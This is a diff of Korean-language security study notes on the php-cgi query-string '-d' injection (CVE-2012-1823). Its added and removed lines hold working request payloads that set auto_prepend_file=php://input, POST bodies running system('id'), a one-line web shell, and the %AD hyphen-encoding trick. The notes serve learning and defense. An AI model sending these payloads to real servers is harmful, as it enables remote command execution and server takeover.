@@ -126,29 +126,50 @@ s\=/index/\\think\\Request/input&filter\=var_dump&data\d3e827b198d120okhacked
   
 
 ---
-## 📎 예제 2. php-cgi(또는 php-cgi.exe) 취약점/오용을 이용한 원격코드실행(RCE)
+## 📎 예제 2. php-cgi RCE (`php-cgi` Query String `-d` 인젝션 취약점)
 
 **php-cgi(또는 php-cgi.exe)** 를 통해 PHP 런타임 설정을 조작해서 `php://input`(요청 바디)을 PHP 코드로 실행하게 만드는 기법.
-php-cgi는 PHP 인터프리터의 CGI(Common Gateway Interface) 실행 파일로, PHP 코드를 해석·실행하는 프로그램 중 하나.
+**php-cgi 바이너리가 외부에서 CGI 방식으로 직접 접근 가능**해야 수행 가능 (`/cgi-bin/php-cgi` 등).
 
-1. **php-cgi 바이너리가 외부에서 CGI 방식으로 직접 접근 가능**해야 함 (`/cgi-bin/php-cgi` 등).
-2. 서버가 쿼리스트링의 `-d` 인자(또는 유사 설정)를 **실제로 처리/허용**해야 함(패치/설정으로 차단되지 않아야 함).
-3. 요청의 쿼리스트링에 `-d auto_prepend_file=php://input`(또는 유사 지시문)이 **정확히 포함**되어야 함.
-4. 요청 바디(POST) 에 **실행 가능한 PHP 코드**(예: `<?php ... ?>`)가 포함되어야 하고, 서버가 그 내용을 실행하도록 설정 변경이 가능해야 함.
-5. WAF/방화벽/서버 설정이 요청을 차단하지 않아야 함.
+#### 🤔 CGI(Common Gateway Interface)
+* 웹 서버와 외부 프로그램을 연결해주는 표준화된 프로토콜
+* 웹 서버가 처리할 수 없는 정보가 웹 서버로 요청되면 그 정보를 처리할 수 있는 외부 프로그램을 호출하고, 외부 프로그램은 요청받은 프로그램 파일을 읽어 HTML으로 반환하는 단계를 거쳐 그 결과를 웹 서버가 받아와 웹 브라우저에게 전송하는 형태
+* 즉, php-cgi는 PHP 인터프리터의 CGI(Common Gateway Interface) 실행 파일로 PHP 코드를 해석·실행하는 프로그램 중 하나.
 
 
-### 페이로드 예시
-
-HTTP GET 요청(쿼리 인코딩된 형태):
+공격자가 웹 서버에 악성 PHP 코드를 삽입하고 실행
 
 ```
-GET /cgi-bin/php-cgi.exe?-d+allow_url_include=1+-d+auto_prepend_file=php://input HTTP/1.1
-Host: victim.com
-...
+https://example.com/php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
 ```
 
-그리고 바로 뒤에 POST 바디(요청 바디)에 실행할 PHP 코드:
+디코딩하면:
+
+```
+-d allow_url_include=1 -d auto_prepend_file=php://input
+```
+
+이 요청은 PHP 인터프리터에게 다음을 강제로 전달하려는 시도입니다:
+
+| 파라미터                               | 설명                               |
+| ---------------------------------- | -------------------------------- |
+| `-d allow_url_include=1`           | PHP 설정을 동적으로 바꿔서 외부 URL을 `include`/`require` 허용    |
+| `-d auto_prepend_file=php://input` | 요청 바디 `php://input`에 포함된 코드를 실행하겠다는 뜻 |
+
+
+### 실제 공격 흐름
+
+```http
+POST /php-cgi.exe?-d allow_url_include=1 -d auto_prepend_file=php://input HTTP/1.1
+Content-Type: text/plain
+
+<?php system('id'); ?>
+```
+
+➡️ 공격자는 PHP 설정을 강제로 우회해서 POST 요청 본문에 PHP 코드를 넣고 그걸 실행하도록 만듭니다.
+위 예시의 요청이 성공하면, `id` 명령이 서버에서 실행되고, 결과가 응답으로 돌아옵니다.
+
+✅ POST 바디(요청 바디)에 실행할 수 있는 추가 PHP 코드 예시 
 
 ```
 <?php system($_GET['cmd']); ?>
@@ -160,64 +181,19 @@ Host: victim.com
 <?php echo 'RCE_OK_12345'; ?>
 ```
 
-이렇게 구성되면 php-cgi가 `auto_prepend_file=php://input`을 적용하여 요청 바디의 PHP 코드를 자동으로 포함·실행하게 되고, 응답 바디에 `RCE_OK_12345` 같은 토큰이 보이면 성공을 의미합니다
-
-* URL은 반드시 올바르게 URL-인코딩 (예: `-d+auto_prepend_file=php://input` → `-d%20auto_prepend_file%3Dphp%3A%2F%2Finput`)
-
-
----
-
-## 📎 예제 2-1. php-cgi RCE (`php-cgi` Query String `-d` 인젝션 취약점)
-
-공격자가 웹 서버에 **악성 PHP 코드**를 삽입하고 실행
-
-```
-POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
-```
-
-### 디코딩하면:
-
-```
-POST /hello.world?-d allow_url_include=1 -d auto_prepend_file=php://input
-```
-
-> `%AD`는 실제로는 **하이픈(-)** 의 잘못된 인코딩 (`-d`), `%3d`는 `=`를 의미.
-
-이 요청은 PHP 인터프리터에게 다음을 강제로 전달하려는 시도입니다:
-
-| 파라미터                               | 설명                               |
-| ---------------------------------- | -------------------------------- |
-| `-d allow_url_include=1`           | PHP 설정을 동적으로 바꿔서 외부 URL 포함 허용    |
-| `-d auto_prepend_file=php://input` | 요청 본문에 포함된 코드를 PHP 파일처럼 실행하겠다는 뜻 |
-
-
-### 실제 공격 흐름
-
-```http
-POST /hello.world?-d allow_url_include=1 -d auto_prepend_file=php://input HTTP/1.1
-Content-Type: text/plain
-
-<?php system('id'); ?>
-```
-
-➡️ 공격자는 **PHP 설정을 강제로 우회해서** POST 요청 본문에 PHP 코드를 넣고 그걸 실행하도록 만듦
-이 요청이 성공하면, **`id` 명령이 서버에서 실행되고**, 결과가 응답으로 돌아옵니다.
-결국 공격자는 원격에서 시스템 명령을 자유롭게 실행할 수 있게 됩니다.
+이렇게 구성되면 php-cgi가 `auto_prepend_file=php://input`을 적용하여 요청 바디의 PHP 코드를 자동으로 포함·실행하게 되고, 응답 바디에 `RCE_OK_12345` 같은 토큰이 보이면 성공을 의미
 
 
 ### 🔥 전형적인 PHP CGI 취약점 공격
 
-이건 **CVE-2012-1823**라는 취약점을 기반으로 한 **PHP-CGI 명령어 인젝션** 공격입니다.
-CGI 방식으로 PHP가 실행될 때 쿼리스트링에서 ini 설정을 허용하는 구성이 있을 경우 악용 가능합니.
-
-### 관련 정보:
+**CVE-2012-1823**라는 취약점을 기반으로 한 **PHP-CGI 명령어 인젝션** 공격입니다.
+CGI 방식으로 PHP가 실행될 때 쿼리스트링에서 ini 설정을 허용하는 구성이 있을 경우 악용 가능합니다.
 
 | 항목      | 내용                                                    |
 | ------- | ----------------------------------------------------- |
 | 취약점     | **CVE-2012-1823**                                     |
 | 영향받는 환경 | PHP가 CGI 모드로 동작하며, 웹서버가 `query string`을 해석하지 않고 넘길 경우 |
 | 결과      | 공격자가 임의 PHP 설정 추가 (`-d`), 코드 실행 가능 (`php://input`)    |
-| 피해      | 완전한 서버 탈취 가능 (웹쉘 업로드 등)                               |
 
 ---
 
